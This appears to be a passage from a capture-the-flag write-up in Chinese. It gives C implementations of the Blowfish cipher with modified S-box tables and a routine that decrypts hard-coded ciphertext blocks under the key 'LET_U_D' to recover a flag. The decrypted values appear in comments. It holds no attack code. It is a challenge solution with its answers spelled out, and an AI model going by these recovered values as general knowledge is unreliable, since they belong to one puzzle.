0x7c40206, 0x2f783c90, 0xe593491f, 0x2b4ace07, 0xeba73a3c,0x44fa6586, 0x56ed2871, 0xd9b3ed4f, 0xb04d3c81, 0x93c1656c, 0xc8044fcb, 0x127ff622, 0x159d9dcf, 0x2fc79936,0x8549ee27, 0x262156cb, 0x721d3364, 0xf5a6f15e, 0x7fe8b137, 0x6cb075da, 0xfaa54cf4, 0x634519ec, 0xde79d57d,0x8b728797, 0x4b994f3e, 0x242eb5e6, 0x274f5cec, 0xc0f072e0, 0xb6928b6f, 0x8922972b, 0x2207de1e, 0xc0236ffa,0xc9dca5e5, 0x8d1286f, 0x90729fa3, 0x6a6ed134, 0x4369fae7, 0xf9ae5610, 0x13398b9e, 0xfdd59299, 0x21a3a98b,0xae6a4a80, 0x6b6e89a6, 0xce85be83, 0xda4c3800, 0x867af755, 0x26b3fb41, 0x96141cce, 0xf176999a, 0x1d844757,0xe27ce11f, 0x18638c21, 0x960ccbf2, 0xe4ccbbae, 0xaa0fab55, 0xf093bd6f, 0x4cb18fad, 0xf27853df, 0x5d5d925b,0xc389a234, 0xa9e9b90b, 0x6f06d9e4, 0xf0389646, 0xc75f5884, 0x9961dd6b, 0x44b1dc6a, 0x7ef092, 0xa4ca52a6,0x5342115d, 0x31d445bb, 0x6cb0b744, 0xd1abcf6, 0x95c6f259, 0xdf719b5d, 0xea51c785, 0xc7303253, 0x1e6a034e,0xf60989f1, 0x93f55b8d, 0xde786239, 0x9d01dfc5, 0xa4cd54ba, 0xfa60804a, 0x3da55ae7, 0x64d673a, 0x5ee1a39c,0x6daa769a, 0xec57802a, 0x7acdc0b0, 0xcdfedc6d, 0x72cb1321, 0x42d07041, 0xa45aa294, 0xdbf5b287, 0xca681d73,0x8d302710, 0x2b1ad68d, 0xc1c6521d, 0x4f40a81c, 0xf4762cb1, 0x8962117f, 0xe33e8bc2, 0xffa7db53, 0xd617f8af,0xd8b1563b, 0x1ed7d3b4, 0x9f998ca6, 0x1c32a736, 0x3513f35f, 0x7a4da8a8, 0x93f43a38, 0x6bf2eac7, 0xfe3041fd,0x8853f184, 0x81c00f3e, 0xc601a409, 0x1ceba826, 0x94bc26cd, 0xd07aaf4e, 0x46884d2, 0x5d4ec036, 0xe5587bf2,0xa3482f3f, 0xdbecc4b2, 0xe5a8e81e, 0x1287e1a3, 0x6e4ef861, 0xb4560ada, 0x5f18f3d5, 0xd9299202, 0xbab5cc00,0x18464f47, 0x58877430, 0xb4335a0a, 0x7a6e33e, 0xe62e23b4, 0x648e0251, 0xdd94b375, 0x719a409f, 0x5d45064d,0x243af927, 0xfbd3ab12, 0xdc74bb88, 0x21a563a8, 0x37b0a314, 0x5da98b1f, 0xfc4d4869, 0xbf0c7320, 0xebf308d3,0x714a3f9a, 0x6606297c, 0x28ff2689, 0xa6779947, 0xfb556d94, 0xb6413de2, 0x21519c0f, 0xb1052485, 0x69c2624b,0xde9cc548, 0xce36df75, 0x5dbfa8a7 },{ 0xaee3df14, 0x399d3136, 0x1c0b3ea1, 0xf8416210, 0x719b0d88, 0x908ce2e5, 0x623e46a2, 0xef7772ec, 0xdbc4da3a,0xe88f6e2e, 0x7fb80562, 0x1a33bfa7, 0xb972b27c, 0xfccb67ab, 0xb53bc933, 0xad99167e, 0x1831a7f0, 0x295e3c91,0x6afb6529, 0xb1d2c1eb, 0x38702ff1, 0xfb03fc16, 0xf85c29e8, 0x154bbcbf, 0xfc10c6d8, 0x1a07656, 0x9ec55090,0x52201a4a, 0x9b0ee83f, 0xe08b560a, 0xaff5a8bc, 0x35c5d6d7, 0x8d1f52f, 0x7b2becf0, 0xaf01ac97, 0x3b8700c9,0xfe56cea4, 0x1c4b14f6, 0xef86351c, 0x27a382c9, 0x28f51829, 0xcdeeee51, 0x3d73d792, 0x152c4a00, 0x7122ccea,0xbe459436, 0x624f6a81, 0xba728d6f, 0xdf7f103d, 0x7faf6a84, 0xd91174e1, 0xef9ca2f5, 0xa0675400, 0x9e0129,0x276f61d4, 0xf6e0bbb, 0x2f5e103d, 0x3d24363f, 0x36f1d769, 0xddabaa4d, 0xbd209d7b, 0x38898cda, 0x59aa0a47,0x3dc28a3b, 0x9374f915, 0x7164635e, 0xa09379f0, 0x462da24e, 0x7a6cd48d, 0xde20ce, 0xeac2f361, 0x9796cbc3,0x2cc87742, 0x2220d2f5, 0xab17e0c2, 0x16cb3b75, 0x5dc0d229, 0x7d14b8c8, 0x86ad060c, 0xfc1ac21c, 0xa25f8e37,0x23e553f1, 0xcfca2eb5, 0xda61f278, 0x7a6d0c2c, 0x10f72c33, 0xb9e7da31, 0xf0271ef1, 0xf6d8d0da, 0xccb9fb54,0x9c16adcc, 0x9c793e5d, 0x308dbae0, 0x8152f53d, 0xb8b02ea8, 0xbb7a73ef, 0x5b52b6e7, 0xda7691a1, 0x6f15166f,0x1bcf2abf, 0xed9eb801, 0xcc07f0d1, 0x30fd146a, 0xed552ed1, 0xfe280048, 0xca519936, 0xc6bb62d3, 0x78eb0ca9,0xde25bf1e, 0x377099d1, 0x9e3d9a2a, 0x58d4fdc5, 0x9ef6d4ba, 0x4c4b801c, 0x8d5c098c, 0x84cad315, 0x43b323ca,0xaff0262, 0x2b3be91f, 0xfd49761b, 0x93671206, 0x2460dd5e, 0x1328fc3, 0xa87f6e1a, 0xceebf4dc, 0x21f7d1d6,0x8dafb785, 0x1f058aa4, 0xf636282e, 0xf5d5c6a2, 0xdcb85ea1, 0xea4ce0f2, 0xb37fcdaa, 0xadb4cd12, 0xa51b34b3,0xb2aa712e, 0xa15f5bd, 0x617f127c, 0x7a5dbd16, 0x8aee5420, 0x4d0af701, 0xb2e113d9, 0xb4d09dcb, 0xd258e319,0x704ec155, 0x533c80be, 0x400c952d, 0xc0dd74a1, 0xa9e5599f, 0xada9e64, 0xa775ef10, 0x35abb495, 0x238b1eb3,0x5c8ea9e9, 0xd63ac5e, 0xecb22c6f, 0x836879b, 0xdb4958b0, 0x26606a34, 0x33fa456d, 0x91dc9940, 0xccbd103, 0x644cf9a7,0x80165230, 0xb0e45576, 0x4d28c64d, 0x8d9841cc, 0x3d42c9d1, 0x6fce26aa, 0xe5bd6421, 0xd0e1eb58, 0xfd61f403,0xdeff165, 0xd5a1bfb1, 0xb3323bbe, 0xdb641c02, 0xbfca7536, 0xb8f5820f, 0xda30db7b, 0xd76a9581, 0x61b8a87f,0x5d8410c2, 0x4b2df093, 0xc96447e9, 0xc4ba2487, 0xb24afc5a, 0x797db008, 0xc362253a, 0xc6bbe115, 0x1cc0ed71,0xabe73320, 0xc4364688, 0x5adef1c2, 0x59af22fb, 0xa9aca101, 0x4b5bac9b, 0xb121e519, 0xd8fcf69e, 0x2f0f0f89,0xef615692, 0xd9fac700, 0x6729f5e, 0x15b5965f, 0x83a0e48a, 0xd80cd549, 0xc85443c6, 0xdb051d9e, 0x8646780f,0x7e1bcd54, 0x7746aafa, 0xbc85c57a, 0x42430bc6, 0x36ab5fb6, 0x92e892ed, 0x87b8897f, 0xefcf526c, 0x6b10f264,0xe72e284, 0x6fe2966, 0x42f18a1f, 0xdff79c2a, 0x77fbe8e7, 0x942c9858, 0x637710f, 0xad12b3b8, 0xcf786ed1, 0xd7cda884,0x2cb1dcf1, 0x94f76ac0, 0xf7c4ebbe, 0x6d5591de, 0x6524ea76, 0x200d037e, 0xeb51ac71, 0x8b37601, 0xc9ac832,0x7721b2a4, 0xca23beee, 0x328c7019, 0xd27fd8c8, 0xc5be7325, 0xe9244524, 0x5b1ea918, 0x74c75201, 0x37621445,0xae75bef7, 0x174937dc, 0xf71c7cef, 0xf41d6ed3, 0x94c2d289, 0x7d68c2f0, 0xbddfcee6, 0x51d86ee8, 0x97379f95,0x4275b8c2, 0xf9b3122c },{ 0x6dbfa6dd, 0x6808c4be, 0x65fb06bd, 0xfde21a89, 0xf4c126b7, 0x438a1cc0, 0x850a843, 0x377114b2, 0x259c0fd,0x5881f166, 0x6e9fa190, 0x899a312e, 0x8001b123, 0x56d91bd5, 0x31b9a6db, 0x5a4f1940, 0x98140dee, 0x73ad8506,0x6649c267, 0x6fd7daa8, 0x682bb9e5, 0x7f9061dc, 0x27732a88, 0xa2755af7, 0x54b1b2ec, 0xc171fe6d, 0x33a31667,0x9afc41e2, 0x396678d5, 0x83cb861, 0xfc473f10, 0x575a023e, 0xfe11cafc, 0xe8ea4057, 0x1289aaa7, 0xa38ef05a,0x502c3f4a, 0xcb0928e9, 0x8d521829, 0x24c29091, 0xc07fbd37, 0x30cad78f, 0xcd8dba45, 0xc8ccbce8, 0xfdaee556,0x2a1fc86f, 0x8206edd4, 0x14c2ec89, 0xf0050d48, 0x31f5c320, 0xa5626fd9, 0x19ca606d, 0x65f46320, 0x43e58985,0xe3f777da, 0x4b9fa89e, 0xf3532d19, 0x1e63ee86, 0xa4c0f1b1, 0x56e691ed, 0xc79b5aa3, 0x1d005b01, 0x7ff86805,0xed4f0ce3, 0x167128ab, 0x96702d6b, 0x6f2cb666, 0x40d6b43d, 0x7f2e27f9, 0x25813783, 0xf06f47fe, 0xa1eb246e,0xe11c9c3f, 0x165237ab, 0xa9719981, 0xe0c072ef, 0xbc1430c8, 0x319018e0, 0x65323013, 0xa6337184, 0xe1c06cf0,0x2c99ecdc, 0xd682f79f, 0x2ebde8d2, 0xbdeca5a8, 0xb85ab458, 0xabc0be15, 0x5ed69b9d, 0x28bf53d3, 0x791d867b,0x86e6a98a, 0xba722e1c, 0x2311281a, 0xc8cce88d, 0x6c2d3743, 0xf868a752, 0xe0b86a8a, 0x70058bb9, 0xba926231,0x86a5a32c, 0x3e907ed6, 0x6f03f61e, 0xa87fbe48, 0xa09e8eaa, 0xdd78f5b, 0x622c29eb, 0x26cce112, 0x57215e0f,0xf9d9b37d, 0xc195133e, 0x703bd721, 0x27f1319b, 0xdccf0b77, 0xb73b7af4, 0xc9f75f9e, 0xf5c62fcb, 0x7293703,0xeed8b98f, 0x4a9bf102, 0x7349d5c7, 0xda6f8b23, 0x34529af2, 0x968579a9, 0x986d4e5f, 0x8d1903a2, 0x8960df2e,0x4dccb15c, 0x6a87f919, 0x8bc8e948, 0x82c8274c, 0x52f8bb80, 0xb3b5512c, 0x6b51a116, 0x16abf8e9, 0x99e48bf6,0xea03be4e, 0xa0766e91, 0x75e2c7e, 0x237be6a5, 0x8c1bd482, 0x473541f5, 0xc4af608b, 0xed686762, 0x1bf0cfc1,0x4844f0ca, 0x6a9a1980, 0x9d01dbf5, 0x10660435, 0x72fb5e04, 0xbf3de5a3, 0x21fbb319, 0xd303ed2f, 0xa30d610a,0x76ff38bb, 0x87136fca, 0xa4d11a77, 0xe6c197fd, 0x4e6bc1d1, 0xf2a87aa9, 0xcc795622, 0xb82be2b4, 0x77487ed2,0x2e7719ad, 0x142854f3, 0xe501258d, 0xb8556c95, 0x4e1a1309, 0x3d74b894, 0xfc1b626d, 0xcff955ec, 0x33bdc46f,0xed6091ef, 0x645f4f02, 0x7707e28a, 0x556f385a, 0xf8758408, 0xb06b762e, 0xa698d074, 0x46147980, 0x22668afc,0xdc1f5fa9, 0x245dc1d5, 0x32c87ded, 0xcfa4f49d, 0x734187b5, 0x700bc670, 0x97beeab3, 0x70f6ad54, 0xf0d6535d,0x76e34811, 0xb734677, 0x7ddbb9d3, 0x2bd695ab, 0xdb2daa29, 0x35c9f605, 0xfc4be706, 0x6e44a54b, 0xa96c5fbe,0x51e51ba6, 0xc4ebe8c7, 0xe103a24a, 0x842b0bac, 0xdfac2d6d, 0x1aed355d, 0xbdeafbde, 0x32338f9d, 0xaa634582,0xe152c83a, 0x84be8504, 0x46291ed, 0x7b863e96, 0xdb6776f8, 0x20f815f2, 0xa82af75d, 0xab76c0f5, 0xd550efa2,0xfd0330f1, 0x22e1fab0, 0x5f4407a3, 0x9b8e9e11, 0xeb1cadde, 0x3d104b1f, 0xc3054713, 0x982eb7fb, 0x543314da,0x13ae6d5d, 0x56594d93, 0x7af9ddb3, 0x5dbd0b3c, 0xeca553d0, 0x5f892e42, 0xdc466104, 0xf3b8fe09, 0xea63cc0e,0xe8187fa1, 0xf587d222, 0x762e3246, 0xe3134afd, 0xc8a909a3, 0x2a1b8843, 0xbcf88b37, 0x106d829d, 0xbc6cb72b,0xba700358, 0x4419c67b, 0x298e5b99, 0x53633710, 0xb4676dfb, 0x5003bfdd, 0x4b1f3fd6, 0xbff5676e, 0xfe221749,0x22769dec, 0xfa874d3f, 0xe3ab93a1, 0x7e7eac49 },{ 0xda47873d, 0xb4067196, 0x35629fff, 0x5f9ba741, 0xfc3b885c, 0x7db96275, 0x4be65d7c, 0xaac5aaff, 0xc48e069f,0xa2b51d88, 0x68efc326, 0x5dc94059, 0xf8fa7b3d, 0xc3e21cc2, 0xa619a16f, 0x46dec824, 0x399fea6, 0x8fc7db62,0x184569be, 0xc5f04731, 0x90c0dea5, 0xc180bf5f, 0xfccbd6c9, 0x49d7a598, 0x96425151, 0xe53c49fb, 0x15713840,0xcea6a8a0, 0x5c360e6b, 0x8278ef53, 0xa45ce852, 0xaf1fa60d, 0xd1d357d4, 0xcac8c677, 0x1258a65b, 0x561cc841,0xe73da602, 0x907e2447, 0xe62e297f, 0x107a743, 0xb0d19719, 0x84bb247a, 0xf8077268, 0xd5f63d60, 0xd9a141de,0x3486e6a4, 0xbe1052bf, 0x5be4fa46, 0xe792c9c8, 0xb9fbf3b0, 0xcfd36c94, 0x726aa896, 0x683cd337, 0x392a533a,0x223657a2, 0xf83da285, 0x16c1a03f, 0x68bdbcf5, 0xada3c5ab, 0x124148a8, 0xe7d2a95c, 0xd11922ac, 0x4c6899fd,0x7d8edf38, 0x118e9247, 0x15c6f2f0, 0x9056dd9f, 0x33520052, 0x7204913c, 0x3171d62d, 0x25d9ff0b, 0x8b629a57,0xc3ea9218, 0x699e2abf, 0xa9ff8e0f, 0x14dd1c3e, 0xee95bbe7, 0xa2e277c9, 0xd3966991, 0xce4fb1c6, 0x62f9c9,0x24bee229, 0xc677cc3e, 0x2163ca36, 0xbf6dd3f1, 0x7ae4222f, 0x4322f038, 0x692542df, 0x6692aca0, 0xf6d4946f,0x89154cfd, 0x9f6a7dbc, 0x104ea9f0, 0x89e3289, 0x87c95990, 0xf945a420, 0xb6a20072, 0x5b630e87, 0x848636c0,0xa48bb210, 0x4d5494bb, 0x7b7fb94f, 0xc48841b7, 0x422a2e4, 0x6d915a09, 0xcdabb5a5, 0xa36a9dd3, 0x2b321655,0xe7bd69cf, 0x8c5a8dd8, 0x74615473, 0x8c143ade, 0x6cb1ce59, 0x4396f842, 0xfccbf901, 0xf39018b0, 0x576ba9f5,0x97aeb15d, 0x6f7df74, 0x30f10bb9, 0x214789d7, 0xdf5edc71, 0xcdd4d413, 0x4e26b481, 0xa96771c4, 0xfbbf9600,0x61b03c10, 0xb41ec41b, 0x50e85e2c, 0x9ae79ae9, 0x1bffa793, 0x18402dde, 0x3a896084, 0x604aca05, 0xf0370269,0x83f6b326, 0xfb64099a, 0xabf943bf, 0xe9aa8b99, 0x54ec3adb, 0xa56b3a46, 0x71c05f89, 0x4a7f1444, 0xdf991094,0x8f5efd28, 0x9ad00ad5, 0x3cbee3c, 0xf5898fc4, 0x692ba57, 0x1928304a, 0x2978de0f, 0x64f85786, 0x62b4f525,0xda78ad05, 0xb3da431b, 0xdde89dde, 0xcc7da3d9, 0xbde46885, 0xd26c42cf, 0xa7850e7c, 0xff3b73d, 0xd60665a5,0x825b2d8c, 0xbce1ba7, 0x12be55de, 0x7cf29faa, 0x71a29eca, 0xbd067b1a, 0x2e33857, 0xf0c7e782, 0x9ac9f181,0x61d9b196, 0x288412eb, 0x756010ba, 0x20f99e06, 0x67e6cb96, 0xd1efb6, 0x1a4dfffb, 0x9d097c31, 0x6890b138,0xa162f385, 0x5038a02a, 0xdcca2edc, 0xd68af382, 0xed5c9bb, 0xe88cf6c4, 0x4c031e98, 0xca08127b, 0xc67a831f,0x306fb3f6, 0x9d7315c5, 0x2c72ae76, 0xdd3b3ecc, 0x2ab71490, 0x6e79ef13, 0xe6aa6316, 0x3729bfbc, 0xa13c9bea,0xa4fa53c, 0xdbafeec6, 0x57a11cc2, 0x8f1be1ba, 0x542a4d3b, 0x8f9c90c4, 0xa2b3ad9f, 0x8951b50, 0xda0641dd,0xd7cdf19b, 0xebe79e9b, 0x7d6ae548, 0x2ae7eb6f, 0x3ebefb7f, 0xb9cf555d, 0x22b46357, 0x963e79b5, 0x81729e6f,0xa0657b30, 0x297d0ea1, 0x2d722676, 0xd7c263c7, 0x8fd31545, 0x74b4d545, 0xc9ddb768, 0xd7af1a95, 0x3b41452d,0xeaa84874, 0x3094af86, 0xc71461f6, 0x8cd49c9b, 0x9d6f96b1, 0x9b45bb4c, 0x58742714, 0x29b19a6a, 0xa85bddc6,0xb1e0cf54, 0xb55e81d4, 0xcb219b85, 0xcea74b66, 0xd28a041e, 0xe28c4803, 0x490de006, 0x19bb91b1, 0x14d67500,0x80243406, 0x1ed8b3e, 0xef5636b3, 0x956f13bd, 0x9ae34304, 0xaea37a2c, 0xc90fe0b9, 0x2301fb8f, 0x55716d77,0xc50297f7, 0x3cabc6a4, 0xa0764bb0, 0xcf38a2a2 } };/*P盒和S盒根据密钥进行变换因为我们直接替换成变换后的P盒和S盒，所以不需要调用*/void getkey(char *keytext){int i = -1, j = 0;unsigned long key[18];while (keytext[++i]);while (i&lt;72) keytext[i++] = 0;memcpy(key, keytext, 72);for (i = 0; i&lt;18; i++) pbx[i] ^= key[i];key[0] = key[1] = 0;for (i = 0; i&lt;18; i += 2){blowfish_encrypt(key, key);memcpy(&amp;pbx[i], key, 8);}for (i = 0; i&lt;4; i++){for (j = 0; j&lt;256; j += 2){blowfish_encrypt(key, key);memcpy(&amp;sbx[i][j], key, 8);}}}void blowfish_encrypt(void *protext, void *ciptext){int i = 0;unsigned long x[2], temp;memcpy(x, protext, 8);for (i = 0; i&lt;16; i++){x[0] ^= pbx[i];x[1] ^= f(x[0]);temp = x[1];x[1] = x[0];x[0] = temp;}temp = x[1];x[1] = x[0];x[0] = temp;x[0] ^= pbx[17];x[1] ^= pbx[16];memcpy(ciptext, x, 8);printf("0x%x,0x%x\n", x[0], x[1]);}void blowfish_decrypt(void *protext, void *ciptext){int i = 0;unsigned long x[2], temp;memcpy(x, ciptext, 8);for (i = 17; i &gt;= 2; i--){x[0] ^= pbx[i];x[1] ^= f(x[0]);temp = x[1];x[1] = x[0];x[0] = temp;}temp = x[1];x[1] = x[0];x[0] = temp;x[0] ^= pbx[0];x[1] ^= pbx[1];memcpy(protext, x, 8);printf("0x%x,0x%x\n", x[0], x[1]);}unsigned long f(unsigned long x){unsigned long a, b, c, d;a = (x &amp; 0xff000000) &gt;&gt; 24;b = (x &amp; 0x00ff0000) &gt;&gt; 16;c = (x &amp; 0x0000ff00) &gt;&gt; 8;d = (x &amp; 0x000000ff) &gt;&gt; 0;return(((sbx[0][a] + sbx[1][b]) ^ sbx[2][c]) + sbx[3][d]);}int main(){char data[] = "abcdefgh";char cipher[]={ 0xBF, 0x4E, 0x6F, 0x54, 0x7B, 0x93, 0xED, 0xB4 };//0x6d616768,0x30447b65//0x7E, 0xA0, 0xD2, 0x82, 0xDD, 0xEF, 0xD3, 0x13-&gt;0x7530795f,0x3465725f//0x0F, 0xAE, 0x09, 0x22, 0x61, 0xDF, 0x4E, 0x59-&gt;0x5f563131,0x336b3131//0x2C, 0x78, 0x33, 0xB9, 0x32, 0xE5, 0x07, 0x1C-&gt;0x7456395f,0x7d6e6f68//blowfish_encrypt(data, cipher);blowfish_decrypt(data, cipher);}</code></pre><p>将多组数据分别代入进行运算，再转为字符串即可，注意小端序</p><p>blowfish_head.h</p><pre class="language-c" data-language="c"><code class="language-c">#ifndef BLOWFISHH#define BLOWFISHH#include&lt;stdlib.h&gt;#include&lt;string.h&gt;void blowfish_encrypt(void*, void*);void blowfish_decrypt(void*, void*);void getkey(char*);unsigned long f(unsigned long);#endif#pragma once</code></pre><h3 id="另一个脚本"><a href="#另一个脚本" class="headerlink" title="另一个脚本"></a>另一个脚本</h3><pre class="language-c" data-language="c"><code class="language-c">#include "BlowFish.h"#include &lt;string.h&gt;#include &lt;stdio.h&gt;// using namespace std;int BlowFishInit(BLOWFISH_CTX* blowCtx, unsigned char* key, unsigned intkeylen){//设置传入的CTX中的SBOX值for (int Row = 0; Row &lt; 4; Row++){for (int Col = 0; Col &lt; 256; Col++){blowCtx-&gt;sbox[Row][Col] = ORIG_S[Row][Col];}}/*设置pbox1.循环18轮2.每轮都设置ctx.pbox值与data ^3.data = *(DWORD*)key[0] key[1].....*/int KeyIndex = 0;for (int index = 0; index &lt; N + 2; index++){unsigned int data = 0;//填充data 将key的字符设置到data当中for (int k = 0; k &lt; 4; k++){//通过移位设置每个字符data = (data &lt;&lt; 8) | key[KeyIndex];KeyIndex++;//如果超出了key长度 那么key要从开始if (KeyIndex &gt;= keylen)KeyIndex = 0;}//否则不满足blowCtx-&gt;pbox[index] = ORIG_P[index] ^ data;}//对一个64位0 进行加密。加密结果的输出设置到pbox[i]与pbox[i+1]中unsigned int Data1 = 0;unsigned int Data2 = 0;for (int i = 0; i &lt; N + 2; i += 2){BlowFish_Encry(blowCtx, &amp;Data1, &amp;Data2);blowCtx-&gt;pbox[i] = Data1;blowCtx-&gt;pbox[i + 1] = Data2;}//初始化Sboxfor (int i = 0; i &lt; 4; i++){for (int j = 0; j &lt; 256; j += 2){BlowFish_Encry(blowCtx, &amp;Data1, &amp;Data2);blowCtx-&gt;sbox[i][j] = Data1;blowCtx-&gt;sbox[i][j + 1] = Data2;}}return 1;}//unsigned int F(PBLOWFISH_CTX blowCtx, unsigned int Data)//{//// unsigned int a, b, c, d;// /*// 利用位运算 取出下标值// *///// a = (Data &gt;&gt; 24) &amp; 0xFF;// b = (Data &gt;&gt; 16) &amp; 0xFF;// c = (Data &gt;&gt; 8) &amp; 0xFf;// d = Data &amp; 0xFF;////// int TempValue = blowCtx-&gt;sbox[0][a] + blowCtx-&gt;sbox[1][b];// TempValue = TempValue ^ blowCtx-&gt;sbox[2][c];// TempValue = TempValue + blowCtx-&gt;sbox[3][d];// //公式 ((a+b)^c)+d// return TempValue;//}static unsigned long F(BLOWFISH_CTX* ctx, unsigned long x) {unsigned short a, b, c, d;unsigned long y;/* d = (unsigned short)(x &amp; 0xFF);x &gt;&gt;= 8;c = (unsigned short)(x &amp; 0xFF);x &gt;&gt;= 8;b = (unsigned short)(x &amp; 0xFF);x &gt;&gt;= 8;a = (unsigned short)(x &amp; 0xFF);//都可以使用*/a = (x &gt;&gt; 24) &amp; 0xFF;b = (x &gt;&gt; 16) &amp; 0xFF;c = (x &gt;&gt; 8) &amp; 0xFf;d = x &amp; 0xFF;y = ctx-&gt;sbox[0][a] + ctx-&gt;sbox[1][b];y = y ^ ctx-&gt;sbox[2][c];y = y + ctx-&gt;sbox[3][d];return y;}void BlowFish_Encry(PBLOWFISH_CTX blowCtx, unsigned int* left, unsigned int*right){unsigned long Xl;unsigned long Xr;unsigned long temp;short i;//加密部分首先将其分为left跟right两组。 每一组分别32位Xl = *left;Xr = *right;for (i = 0; i &lt; N; ++i) {Xl = Xl ^ blowCtx-&gt;pbox[i];Xr = F(blowCtx, Xl) ^ Xr;temp = Xl;Xl = Xr; //交换左右的值。 l = R r= l 继续下一轮循环。总共16轮Xr = temp;}temp = Xl;Xl = Xr; //16轮完毕之后交换变量Xr = temp;Xr = Xr ^ blowCtx-&gt;pbox[N]; //最后进行一次疑或Xl = Xl ^ blowCtx-&gt;pbox[N + 1];*left = Xl;*right = Xr;}void BlowFish_Decrypt(PBLOWFISH_CTX blowCtx, unsigned int* left, unsigned int*right){unsigned int Xl = *left;unsigned int Xr = *right;//倒着循环for (int i = N + 1; i &gt; 1; --i){Xl = Xl ^ blowCtx-&gt;pbox[i];Xr = Xr ^ F(blowCtx, Xl);//继续左右交换unsigned int temp = Xl;Xl = Xr;Xr = temp;}//最后一轮继续交换unsigned int temp = Xl;Xl = Xr;Xr = temp;//返还原Xr = Xr ^ blowCtx-&gt;pbox[1];Xl = Xl ^ blowCtx-&gt;pbox[0];//设置变量返回*left = Xl;*right = Xr;}// int main()// {// unsigned int L = 1, R = 2;// BLOWFISH_CTX ctx;// BlowFishInit(&amp;ctx,(unsigned char*)"IBinary",strlen("IBinary"));// BlowFish_Encry(&amp;ctx, &amp;L, &amp;R);// BlowFish_Decrypt(&amp;ctx, &amp;L, &amp;R);// }void main(void) {// unsigned int L = 1, R = 2;unsigned int L1 = 0x546F4EBF, R1 = 0x0B4ED937B;BLOWFISH_CTX ctx;BlowFishInit(&amp;ctx, (unsigned char*)"LET_U_D", 7);BlowFish_Decrypt(&amp;ctx, &amp;L1, &amp;R1);printf("%x %x\n", L1, R1);unsigned int L2 = 0x82D2A07E, R2 = 0x13D3EFDD;BlowFishInit(&amp;ctx, (unsigned char*)"LET_U_D", 7);BlowFish_Decrypt(&amp;ctx, &amp;L2, &amp;R2);printf("%x %x\n", L2, R2);unsigned int L3 = 0x2209AE0F, R3 = 0x594EDF61;BlowFishInit(&amp;ctx, (unsigned char*)"LET_U_D", 7);BlowFish_Decrypt(&amp;ctx, &amp;L3, &amp;R3);printf("%x %x\n", L3, R3);unsigned int L4 = 0x0B933782C, R4 = 0x1C07E532;BlowFishInit(&amp;ctx, (unsigned char*)"LET_U_D", 7);BlowFish_Decrypt(&amp;ctx, &amp;L4, &amp;R4);printf("%x %x\n", L4, R4);}</code></pre><p>BlowFish.h</p><pre class="language-c" data-language="c"><code class="language-c">#pragma once#pragma once/*使用BlowFish进行加解密*///定义全局旧的pbox sbox 都是根据小数来的。#define N 16static const unsigned long ORIG_P[16 + 2] = {0x243F6A88L, 0x85A308D3L, 0x13198A2EL, 0x03707344L,0xA4093822L, 0x299F31D0L, 0x082EFA98L, 0xEC4E6C89L,0x452821E6L, 0x38D01377L, 0xBE5466CFL, 0x34E90C6CL,0xC0AC29B7L, 0xC97C50DDL, 0x3F84D5B5L, 0xB5470917L,0x9216D5D9L, 0x8979FB1BL};static const unsigned long ORIG_S[4][256] = {{ 0xD1310BA6L, 0x98DFB5ACL, 0x2FFD72DBL, 0xD01ADFB7L,0xB8E1AFEDL, 0x6A267E96L, 0xBA7C9045L, 0xF12C7F99L,0x24A19947L, 0xB3916CF7L, 0x0801F2E2L, 0x858EFC16L,0x636920D8L, 0x71574E69L, 0xA458FEA3L, 0xF4933D7EL,0x0D95748FL, 0x728EB658L, 0x718BCD58L, 0x82154AEEL,0x7B54A41DL, 0xC25A59B5L, 0x9C30D539L, 0x2AF26013L,0xC5D1B023L, 0x286085F0L, 0xCA417918L, 0xB8DB38EFL,0x8E79DCB0L, 0x603A180EL, 0x6C9E0E8BL, 0xB01E8A3EL,0xD71577C1L, 0xBD314B27L, 0x78AF2FDAL, 0x55605C60L,0xE65525F3L, 0xAA55AB94L, 0x57489862L, 0x63E81440L,0x55CA396AL, 0x2AAB10B6L, 0xB4CC5C34L, 0x1141E8CEL,0xA15486AFL, 0x7C72E993L, 0xB3EE1411L, 0x636FBC2AL,0x2BA9C55DL, 0x741831F6L, 0xCE5C3E16L, 0x9B87931EL,0xAFD6BA33L, 0x6C24CF5CL, 0x7A325381L, 0x28958677L,0x3B8F4898L, 0x6B4BB9AFL, 0xC4BFE81BL, 0x66282193L,0x61D809CCL, 0xFB21A991L, 0x487CAC60L, 0x5DEC8032L,0xEF845D5DL, 0xE98575B1L, 0xDC262302L, 0xEB651B88L,0x23893E81L, 0xD396ACC5L, 0x0F6D6FF3L, 0x83F44239L,0x2E0B4482L, 0xA4842004L, 0x69C8F04AL, 0x9E1F9B5EL,0x21C66842L, 0xF6E96C9AL, 0x670C9C61L, 0xABD388F0L,0x6A51A0D2L, 0xD8542F68L, 0x960FA728L, 0xAB5133A3L,0x6EEF0B6CL, 0x137A3BE4L, 0xBA3BF050L, 0x7EFB2A98L,0xA1F1651DL, 0x39AF0176L, 0x66CA593EL, 0x82430E88L,0x8CEE8619L, 0x456F9FB4L, 0x7D84A5C3L, 0x3B8B5EBEL,0xE06F75D8L, 0x85C12073L, 0x401A449FL, 0x56C16AA6L,0x4ED3AA62L, 0x363F7706L, 0x1BFEDF72L, 0x429B023DL,0x37D0D724L, 0xD00A1248L, 0xDB0FEAD3L, 0x49F1C09BL,0x075372C9L, 0x80991B7BL, 0x25D479D8L, 0xF6E8DEF7L,0xE3FE501AL, 0xB6794C3BL, 0x976CE0BDL, 0x04C006BAL,0xC1A94FB6L, 0x409F60C4L, 0x5E5C9EC2L, 0x196A2463L,0x68FB6FAFL, 0x3E6C53B5L, 0x1339B2EBL, 0x3B52EC6FL,0x6DFC511FL, 0x9B30952CL, 0xCC814544L, 0xAF5EBD09L,0xBEE3D004L, 0xDE334AFDL, 0x660F2807L, 0x192E4BB3L,0xC0CBA857L, 0x45C8740FL, 0xD20B5F39L, 0xB9D3FBDBL,0x5579C0BDL, 0x1A60320AL, 0xD6A100C6L, 0x402C7279L,0x679F25FEL, 0xFB1FA3CCL, 0x8EA5E9F8L, 0xDB3222F8L,0x3C7516DFL, 0xFD616B15L, 0x2F501EC8L, 0xAD0552ABL,0x323DB5FAL, 0xFD238760L, 0x53317B48L, 0x3E00DF82L,0x9E5C57BBL, 0xCA6F8CA0L, 0x1A87562EL, 0xDF1769DBL,0xD542A8F6L, 0x287EFFC3L, 0xAC6732C6L, 0x8C4F5573L,0x695B27B0L, 0xBBCA58C8L, 0xE1FFA35DL, 0xB8F011A0L,0x10FA3D98L, 0xFD2183B8L, 0x4AFCB56CL, 0x2DD1D35BL,0x9A53E479L, 0xB6F84565L, 0xD28E49BCL, 0x4BFB9790L,0xE1DDF2DAL, 0xA4CB7E33L, 